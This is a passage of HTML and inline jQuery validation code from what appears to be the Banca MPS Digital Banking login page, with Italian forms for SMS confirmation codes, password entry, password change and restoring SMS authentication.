                                                <label class="mps_label dB_label">Non hai ricevuto il codice?</label>
                                                <a href="javascript: void(0)" class="mps_label dB_label_link" data-template="#button-btnRecoverCodConferma">Recupera codice</a>
                                            </div>
                                        </div>
                                        <div id="inviaNuovaNotifica" class="row" style="display:none;">
                                            <div class="col-md-24" tabindex="0" id="loginOtp3">
                                                <label class="mps_label dB_label codice-otp-mt">Tentativo di autorizzazione fallito. </label>
                                                <a href="javascript: void(0)" class="mps_label dB_label_link dB_label_link_upper" data-template="#button-btnRecoverCodConferma">Rimanda nuova notifica</a>
                                            </div>
                                        </div>
                                        <div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
                                            <h5><a id="linkCarteSicurezza9" href="https://digital.mps.it/pri/login/home_mobile.jsp#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&amp;pageId=nav_recupero_credenziali', '_self');">
RECUPERA CODICE UTENTE
</a></h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                //ENTER TO SUBMIT
                                document.getElementById("input-otp")
                                    .addEventListener("keyup", function(event) {
                                        if ((event.keyCode == 13) && ($("#input-otp").val().length >= 6) && ($("#input-otp").val().length <= 8)) {
                                            $("#avantiOtp").click();
                                        }
                                    });

                                $("input#input-otp").bind("change keyup input", function(e) {
                                    var ipt = $('#input-otp').val();
                                    if (($('#lunghezzaCodiceConferma').val()) == "6") {
                                        document.getElementById("input-otp").maxLength = "6";
                                        //console.log("SMS");
                                        //$("#inserisciCodiceConferma").attr('maxlength','6');// sms
                                        if (ipt.length < 1) {
                                            $('#cCheck').css('display', 'none');
                                            $('#cError').css('display', 'none');
                                            $('#button-btnGoToIn').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if (ipt.length < 6) {
                                            $('#cCheck').css('display', 'none');
                                            $('#cError').css('display', 'block');
                                            $('#button-btnGoToIn').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if ((ipt.length == 6) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "desktop")) {
                                            $('#cError').css('display', 'none');
                                            $('#cCheck').css('display', 'block');
                                            $('#button-btnGoToIn').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                            $('#input-otp').val($('#input-otp').val().substr(0, 6));
                                        } else if ((ipt.length == 6) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "mobile")) {
                                            $('#cError').css('display', 'none');
                                            $('#cCheck').css('display', 'block');
                                            $('#button-btnGoToIn').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                            $('#input-otp').val($('#input-otp').val().substr(0, 6));
                                        } else {
                                            $('#cError').css('display', 'block');
                                            $('#cCheck').css('display', 'none');
                                            $('#button-btnGoToIn').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        }
                                    } else {
                                        $("#input-otp").attr('maxlength', '8'); // dispositivo opt
                                        if (ipt.length < 1) {
                                            $('#cCheck').css('display', 'none');
                                            $('#cError').css('display', 'none');
                                            $('#button-btnGoToIn').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if ((ipt.length >= 6) &&
                                            (ipt.length <= 8) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "desktop")) {
                                            $('#cError').css('display', 'none');
                                            $('#cCheck').css('display', 'block');
                                            $('#button-btnGoToIn').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                        } else if ((ipt.length >= 6) &&
                                            ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "mobile")) {
                                            $('#cError').css('display', 'none');
                                            $('#cCheck').css('display', 'block');
                                            $('#button-btnGoToIn').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                        } else {
                                            $('#cError').css('display', 'block');
                                            $('#cCheck').css('display', 'none');
                                            $('#button-btnGoToIn').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        }
                                    }
                                });
                            </script>
                        </div>
                        <div id="includeBloccoTokenFisico" class="margin_login_header dB_box_container" style="display: none;">
                            &nbsp;
                            <div id="login-codiceUtente">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale mps_label">
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                Gentile Cliente,
                                            </div>
                                        </div>
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                dal <b>14 settembre 2019 non è più possibile accedere a Digital Banking con la chiave elettronica.</b>
                                            </div>
                                        </div>
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                Per accedere ai servizi online e confermare le operazioni dispositive effettuate tramite Digital Banking, sarà invece necessario inserire un <b>codice di conferma </b> dinamico e univoco inviato via SMS*
                                                sul tuo numero di cellulare certificato.
                                            </div>
                                        </div>
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                <b>Per passare </b>alla <b>modalità di invio</b> dei codici di conferma <b>via SMS* e continuare ad utilizzare Digital Banking puoi rivolgerti al personale della Banca in una delle nostre filiali.</b>
                                            </div>
                                        </div>
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                <b>Fino a quando non avrai effettuato il passaggio non potrai accedere a Digital Banking.</b>
                                            </div>
                                        </div>
                                        <div class="row pt-3">
                                            <div class="col-md-24">
                                                Questo adeguamento si è reso necessario per ottemperare al <b>Regolamento Delegato (UE) 2018/389</b>, che introduce alcune novità al fine di aumentare i livelli di sicurezza per i pagamenti elettronici.
                                                Per approfondimenti visita il sito
                                                <a id="sicurezzeMpsLink" href="https://digital.mps.it/pri/login/home_mobile.jsp#" onclick="javascript:widiba.util.openLinkFromMobile('http://www.mps.it/sicurezza.html','_blank',true)">
www.mps.it/sicurezza.html</a>.
                                            </div>
                                        </div>
                                        <div class="row pt-5 h6">
                                            <div class="col-md-24">
                                                *Gli SMS contenenti i codici di conferma sono gratuiti. Non è garantita la ricezione degli SMS su SIM estere o su SIM italiane in roaming all’estero.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="includePswBlue" class="margin_login_header includePswBlue dB_box_container" style="display:none;">
                            <input type="hidden" name="widgetId" id="widgetId">
                            <div id="login-passwordBlu">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Accedi al tuo Digital Banking</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label id="labelPswBluSca" class="mps_label dB_label" for="input-pswBlu" style="float: left; color: #0000ff !important;">Password
blu</label>
                                                    <div id="tooltipContentBlu" class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci la password blu che hai ricevuto via SMS."></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="tel" class="form-control mps_input mps_input_password_blu conceal" id="input-pswBlu" pattern="[0-9]*" placeholder="Inserisci la password blu" data-input="password" maxlength="8" aria-required="true" onkeypress="return digitalBankingSCA.isNumberKey(event);" autofocus="" autocomplete="off">
                                                <a id="pBCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="pBError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5 paddingTop-Login">
                                                <a href="javascript: void(0)" id="avantiPswBlu" data-template="#button-btnAvantiPswBlu" tabindex="-1" role="button" data-json-url="/pri/loginib/gestionePasswordBluTestMobileTokenSca.action?nullnull">
                                                    <button id="btnAvantiPswBlu" type="button" class="btn btn-lg btn-primary" disabled="" tabindex="-1">
AVANTI
</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div id="mostraCaptchaPswBlue" class="row" style="margin-top:20px;">
                                            <script type="widiba-template/text" id="idUno">Login</script>
                                            <div class="col-md-24 form-group mps_input_with_label_container">
                                                <div id="idCaptchaPSWBlue" class="wd_row wd_indent">
                                                    <div id="recaptchaPSWBlue" name="recaptchaPSWBlue" align="center"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="linkRecuperaPswBlu" class="row" style="margin-top:20px;">
                                            <div class="col-md-24" tabindex="0" id="loginPwdBlu1">
                                                <label class="mps_label dB_label">Hai dimenticato la password blu?</label>
                                                <a href="javascript: void(0)" title="Recupera password blu" class="mps_label dB_label_link dB_label_link_PwdBlu" data-template="#button-btnRecoverPswBlu">Recupera password blu</a>
                                            </div>
                                        </div>
                                        <div id="linkRecuperaPswBluKO" class="row" style="margin-top:20px; display:none;">
                                            <div class="col-md-24">
                                                <label class="mps_label dB_label">Hai dimenticato la password blu?</label>
                                                <a href="javascript: void(0)" title="Recupera password blu" class="mps_label dB_label_link" data-template="#button-btnRecoverPswBluKO">Recupera password blu</a>
                                            </div>
                                        </div>
                                        <div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
                                            <h5><a id="linkCarteSicurezza9" href="https://digital.mps.it/pri/login/home_mobile.jsp#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&amp;pageId=nav_recupero_credenziali', '_self');">
RECUPERA CODICE UTENTE
</a></h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                //ENTER TO SUBMIT
                                document.getElementById("input-pswBlu").addEventListener("keyup", function(event) {
                                    if (event.keyCode == 13 && $("#input-pswBlu").val().length == 8) {
                                        $("#avantiPswBlu").click();
                                    }
                                });


                                //Controllo lunghezza Input			 
                                $("#input-pswBlu").keyup(function() {
                                    var ipt = $('#input-pswBlu').val();
                                    if (ipt.length < 1) {
                                        $('#pBCheck').css('display', 'none');
                                        $('#pBError').css('display', 'none');
                                        $('#btnAvantiPswBlu').prop("disabled", true);
                                        $('#avantiPswBlu').prop("tabindex", -1);
                                    } else if (ipt.length < 8) {
                                        $('#pBCheck').css('display', 'none');
                                        $('#pBError').css('display', 'block');
                                        $('#btnAvantiPswBlu').prop("disabled", true);
                                        $('#avantiPswBlu').prop("tabindex", -1);
                                    } else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
                                        $('#pBError').css('display', 'none');
                                        $('#pBCheck').css('display', 'block');
                                        $('#btnAvantiPswBlu').prop("disabled", false);
                                        $('#avantiPswBlu').prop("tabindex", 0);
                                    } else {
                                        $('#pBError').css('display', 'block');
                                        $('#pCheck').css('display', 'none');
                                        $('#btnAvantiPswBlu').prop("disabled", true);
                                        $('#avantiPswBlu').prop("tabindex", -1);
                                    }
                                });
                            </script>
                        </div>
                        <div id="includeNewPsw" class="margin_login_header includeNewPsw dB_box_container" style="display: none;">
                            <style>
                                .marginBottom {
                                    margin-bottom: 15px;
                                }
                            </style>
                            <div id="login-newPassword">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Accedi al tuo Digital Banking</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row" style="margin-bottom:20px;">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label">Nuova password</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="La nuova password non può contenere la tua data di nascita, numero di cellulare o codice utente. Inoltre deve contenere almeno 3 cifre non in sequenza.">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input id="input-newPsw1" type="tel" name="newPassword1" pattern="[0-9]*" inputmode="numeric" data-input="password" class="mps_input conceal" placeholder="Inserisci la nuova password" autocomplete="off" maxlength="8" onkeypress="return digitalBankingSCA.isNumberKey(event); " autofocus="">
                                                <a id="psw1Check" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="psw1Error" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5"></div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label">Conferma password</label>
                                                    <div class="mps_tooltip_white_background_red_Custom dB_tooltip_margin divtooltipCodiceConferma" data-toggle="tooltip" title="" data-original-title="Conferma nuova password deve essere uguale a nuova password, controlla quello che hai scritto.">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="tel" id="input-newPsw2" name="newPassword2" pattern="[0-9]*" inputmode="numeric" data-input="password" class="mps_input conceal" placeholder="Ripeti la nuova password" value="" autocomplete="off" maxlength="8" onkeypress="return digitalBankingSCA.isNumberKey(event); ">
                                                <a id="psw2Check" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="psw2Error" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5">
                                                <a href="javascript: void(0)" tabindex="-1" role="button" id="loginNewPwdBlu" data-template="#button-btnAvantiNewPsw" data-json-url="/pri/loginib/controlNewPasswordMobileTokenSCAJSON.action?sezId=login_ib_accesso&amp;pageId=login_ib_accesso">
                                                    <button id="btnAvantiNewPsw" type="button" class="btn btn-lg btn-primary" disabled="">AVANTI</button>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
                                    <h5><a id="linkCarteSicurezza9" href="https://digital.mps.it/pri/login/home_mobile.jsp#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&amp;pageId=nav_recupero_credenziali', '_self');">
RECUPERA CODICE UTENTE
</a></h5>
                                </div>
                            </div>
                            <script type="text/javascript">
                                $(document).ready(function() {

                                    $("#input-newPsw1").keyup(function() {
                                        var ipt = $('#input-newPsw1').val();
                                        if (ipt.length < 1) {
                                            $('#psw1Check').css('display', 'none');
                                            $('#psw1Error').css('display', 'none');
                                        } else if (ipt.length < 8) {
                                            $('#psw1Check').css('display', 'none');
                                            $('#psw1Error').css('display', 'block');
                                        } else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
                                            $('#psw1Error').css('display', 'none');
                                            $('#psw1Check').css('display', 'block');
                                        } else {
                                            $('#psw1Error').css('display', 'block');
                                            $('#psw1Check').css('display', 'none');
                                        }

                                        $('#input-newPsw2').val('');
                                        $('#psw2Check').css('display', 'none');
                                        $('#psw2Error').css('display', 'none');
                                    });

                                    $("#input-newPsw2").keyup(function() {

                                        var first = $('#input-newPsw2').val();
                                        var second = $('#input-newPsw1').val();

                                        if ((first.length == 8) && (first == second)) {
                                            $('#btnAvantiNewPsw').prop("disabled", false);
                                            $('#avantiNewPsw').prop("tabindex", 0);
                                            $('#psw2Check').css('display', 'block');
                                            $('#psw2Error').css('display', 'none');
                                        } else if ((first.length == 8) && (second != first)) {
                                            $('#btnAvantiNewPsw').prop("disabled", true);
                                            $('#avantiNewPsw').prop("tabindex", -1);
                                            $('#psw2Check').css('display', 'none');
                                            $('#psw2Error').css('display', 'block');
                                        } else {
                                            $('#btnAvantiNewPsw').prop("disabled", true);
                                            $('#avantiNewPsw').prop("tabindex", -1);
                                            $('#psw2Check').css('display', 'none');
                                            $('#psw2Error').css('display', 'block');
                                        }

                                    });

                                });

                                //ENTER TO SUBMIT
                                document.getElementById("input-newPsw2").addEventListener("keyup",
                                    function(event) {
                                        if (event.keyCode == 13 &&
                                            $("#input-newPsw2").val().length == 8 &&
                                            $("#input-newPsw2").val() == $("#input-newPsw1")
                                            .val()) {
                                            $("#btnAvantiNewPsw").click();
                                        }
                                    });
                            </script>
                        </div>
                        <div id="includePswEnroll" class="margin_login_header includePswEnroll dB_box_container" style="display: none;">
                            <div id="login-enrolledSCA" tabindex="0" aria-label="Accedi come ">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>
                                                            Accedi come <b></b></h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-pswEnrolled" style="float: left;">Password</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci la password"></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="tel" class="form-control mps_input conceal" id="input-pswEnrolled" placeholder="Inserisci la password" maxlength="8" aria-required="true" onkeypress="return digitalBankingSCA.isNumberKey(event);" autocomplete="off" autofocus="">
                                                <a id="enCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="enError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5">
                                                <a href="javascript: void(0)" tabindex="0" role="button" id="login-enrolledSCA0" data-template="#button-btnAvantiPsw" data-json-url="/pri/loginib/generateOptPostPWMobileTokenScaJSON.action?nullnull" class="db_text_white">
                                                    <button id="btnEntraEnrolled" type="button" tabindex="-1" class="btn btn-lg btn-primary" disabled="">
ENTRA
</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div class="row" style="margin-top: 20px;">
                                            <div class="col-md-24" tabindex="0" id="login-enrolledSCA1">
                                                <label class="mps_label dB_label">Hai dimenticato la password?</label> <a id="linkRecuperaPassword" href="https://digital.mps.it/pri/login/home_mobile.jsp#" onclick="open_win();" title="Recupera Password" class="mps_label dB_label_link">Recupera password</a>
                                            </div>
                                        </div>
                                        <div style="padding-top: 15px">
                                            <h5>
                                                <a id="linkCarteSicurezza21" class="linkLogin" href="javascript: void(0)" data-template="#button-buttonEntraAltroUtente" tabindex="0" data-json-url="/pri/loginib/resetCookieHPCredenziali_AvalonMobileToken.action?nullnull">CAMBIA UTENTE</a>
                                            </h5>
                                        </div>
                                        <div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
                                            <h5><a id="linkCarteSicurezza9" href="https://digital.mps.it/pri/login/home_mobile.jsp#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&amp;pageId=nav_recupero_credenziali', '_self');">
RECUPERA CODICE UTENTE
</a></h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                document.getElementById("input-pswEnrolled").addEventListener("keyup",
                                    function(event) {
                                        if (event.keyCode == 13 && $("#input-pswEnrolled").val().length == 8) {
                                            $("#btnEntraEnrolled").click();
                                        }
                                    });

                                //Controllo lunghezza Input			 
                                $("#input-pswEnrolled").keyup(function() {
                                    var ipt = $('#input-pswEnrolled').val();
                                    if (ipt.length < 1) {
                                        $('#enCheck').css('display', 'none');
                                        $('#enError').css('display', 'none');
                                        $('#btnEntraEnrolled').prop("disabled", true);
                                        $('#login-enrolledSCA0').prop("tabindex", -1);
                                    } else if (ipt.length < 8) {
                                        $('#enCheck').css('display', 'none');
                                        $('#enError').css('display', 'block');
                                        $('#btnEntraEnrolled').prop("disabled", true);
                                        $('#login-enrolledSCA0').prop("tabindex", -1);
                                    } else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
                                        $('#enError').css('display', 'none');
                                        $('#enCheck').css('display', 'block');
                                        $('#btnEntraEnrolled').prop("disabled", false);
                                        $('#login-enrolledSCA0').prop("tabindex", 0);
                                    } else {
                                        $('#enError').css('display', 'block');
                                        $('#enCheck').css('display', 'none');
                                        $('#btnEntraEnrolled').prop("disabled", true);
                                        $('#login-enrolledSCA0').prop("tabindex", -1);
                                    }
                                });

                                $('#forcetokencollaudoENROLL').on('ifChecked', function(event) {
                                    $('#input-pswEnrolled').focus();
                                });

                                function open_win() {
                                    window.open('/pub/pb/aolInizio/action/pb/recuperaCredenzialiPasswordInit.action?sezId=nav_recupero_credenziali&pageId=nav_recupero_credenziali', '_blank');
                                }
                            </script>
                        </div>
                        <div id="login_ripristinaMTOtp" class="margin_login_header includePsw-ripstinaMT dB_box_container" style="display: none;">
                            <input type="hidden" id="otp-sms" class="wd_default" style="display: none;" value="Codice SMS">
                            <input type="hidden" id="otp" class="wd_default" style="display: none;" value="Chiave elettronica">
                            <div id="login-otp-ripristinaMT">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Ripristina l'SMS</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-otp-ripristinaMT" id="codice-otp-ripristinaMT">Codice SMS</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" data-original-title="Inserisci il Codice di Conferma di 6 cifre che hai ricevuto via SMS"></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="tel" class=" mps_input conceal" id="input-otp-ripristinaMT" placeholder="Inserisci il codice di conferma" value="" autocomplete="one-time-code" maxlength="6" autofocus="" aria-required="true" onkeypress="return digitalBankingSCA.isNumberKey(event);">
                                                <a id="cCheckMT" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="cErrorMT" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5">
                                                <a href="javascript: void(0)" data-template="#button-btnConfirm-ripristinaMT" id="disattivaMT" tabindex="-1" role="button" data-json-url="/pri/loginib/checkSMSRipristinaMT.action?nullnull">
                                                    <button type="button" id="button-btnGoToInMT" tabindex="-1" class="btn btn-primary" disabled="">CONFERMA</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div id="linkRecuperaCodConferma" class="row" style="display:none;">
                                            <div class="col-md-24" tabindex="0" id="loginOtp2">
                                                <label class="mps_label dB_label">Non hai ricevuto il codice?</label>
                                                <a href="javascript: void(0)" class="mps_label dB_label_link" data-template="#button-btnRecoverCodConferma">Recupera codice</a>
                                            </div>
                                        </div>
                                        <div class="row" style="margin-top:20px;" tabindex="0" id="loginStepPassword5">
                                            <div class="col-md-24">
                                                <a id="linkAnnullaOperazione" href="https://digital.mps.it/pri/login/home_mobile.jsp#" onclick="location.reload();" title="Recupera password" class="mps_label dB_label_link">Annulla e torna alla Home Page</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="login-otp-ripristinaMTConfirm" style="display:none">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Ripristina l'SMS</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-19 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-otp-ripristinaMT" id="codice-otp-ripristinaMT"> L’Accesso con le Notifiche è stato disattivato correttamente. Esegui di nuovo l’accesso. </label>
                                                </div>
                                            </div>
                                            <div class="col-md-5">
                                                <a data-template="#button-btnDoneMT" id="disattivaMT" onclick="location.reload();" tabindex="-1" role="button">
                                                    <button type="button" id="button-btnGoToInMT" tabindex="-1" class="btn btn-primary">Accedi</button>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                //ENTER TO SUBMIT
                                document.getElementById("input-otp-ripristinaMT")
                                    .addEventListener("keyup", function(event) {
                                        if ((event.keyCode == 13) && ($("#input-otp-ripristinaMT").val().length >= 6) && ($("#input-otp-ripristinaMT").val().length <= 8)) {
                                            $("#disattivaMT").click();
                                        }
                                    });

                                $("input#input-otp-ripristinaMT").bind("change keyup input", function(e) {
                                    var ipt = $('#input-otp-ripristinaMT').val();
                                    if (($('#lunghezzaCodiceConferma').val()) == "6") {
                                        document.getElementById("input-otp").maxLength = "6";
                                        //console.log("SMS");
                                        //$("#inserisciCodiceConferma").attr('maxlength','6');// sms
                                        if (ipt.length < 1) {
                                            $('#cCheckMT').css('display', 'none');
                                            $('#cErrorMT').css('display', 'none');
                                            $('#button-btnGoToInMT').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if (ipt.length < 6) {
                                            $('#cCheckMT').css('display', 'none');
                                            $('#cErrorMT').css('display', 'block');
                                            $('#button-btnGoToInMT').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if ((ipt.length == 6) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "desktop")) {
                                            $('#cErrorMT').css('display', 'none');
                                            $('#cCheckMT').css('display', 'block');
                                            $('#button-btnGoToInMT').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                            $('#input-otp').val($('#input-otp').val().substr(0, 6));
                                        } else if ((ipt.length == 6) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "mobile")) {
                                            $('#cErrorMT').css('display', 'none');
                                            $('#cCheckMT').css('display', 'block');
                                            $('#button-btnGoToInMT').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                            $('#input-otp').val($('#input-otp').val().substr(0, 6));
                                        } else {
                                            $('#cErrorMT').css('display', 'block');
                                            $('#cCheckMT').css('display', 'none');
                                            $('#button-btnGoToInMT').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        }
                                    } else {
                                        $("#input-otp").attr('maxlength', '8'); // dispositivo opt
                                        if (ipt.length < 1) {
                                            $('#cCheckMT').css('display', 'none');
                                            $('#cErrorMT').css('display', 'none');
                                            $('#button-btnGoToInMT').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        } else if ((ipt.length >= 6) &&
                                            (ipt.length <= 8) && ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "desktop")) {
                                            $('#cErrorMT').css('display', 'none');
                                            $('#cCheckMT').css('display', 'block');
                                            $('#button-btnGoToInMT').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                        } else if ((ipt.length >= 6) &&
                                            ($.isNumeric(ipt)) && (document.getElementById("appDevice").value == "mobile")) {
                                            $('#cErrorMT').css('display', 'none');
                                            $('#cCheckMT').css('display', 'block');
                                            $('#button-btnGoToInMT').prop("disabled", false);
                                            $('#avantiOtp').prop("tabindex", 0);
                                        } else {
                                            $('#cErrorMT').css('display', 'block');
                                            $('#cCheckMT').css('display', 'none');
                                            $('#button-btnGoToInMT').prop("disabled", true);
                                            $('#avantiOtp').prop("tabindex", -1);
                                        }
                                    }
                                });


                                //ADEGUAMENTO IPOVEDENTI
                                document.getElementById('loginOtp1').addEventListener("keydown", function(event) {
                                    if (event.keyCode == 13 || event.keyCode == 32)
                                        $('#checkRicordami').click();
                                });
                            </script>
                        </div>
                        <div id="includePsw-ripstinaMT" class="margin_login_header includePsw-ripstinaMT dB_box_container" style="display: none;">
                            <div id="login-password-ripristinaMT">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Ripristina l'SMS</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-24 db_colLabelCustom" id="loginStepPassword2-ripristinaMT">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-password-ripristinaMT">Per ripristinare <b>SMS</b> al posto delle <b>Notifiche</b> inserisci la password e clicca su Avanti</label>
                                                </div>
                                            </div>
                                            <div class="col-md-6 db_colLabelCustom" id="loginStepPassword2">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-password">Password</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci la password di 8 cifre per accedere a Digital Banking."></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom" id="loginStepPassword3-ripristinaMT">
                                                <input type="tel" class="form-control mps_input conceal" id="input-password-ripristinaMT" autocomplete="off" maxlength="8" placeholder="Inserisci la password" onkeypress="return digitalBankingSCA.isNumberKey(event);" autofocus="" aria-required="true" aria-label="Inserisci la password di 8 cifre per accedere a Digital Banking.">
                                                <a id="pCheckMT" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="pErrorMT" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5">
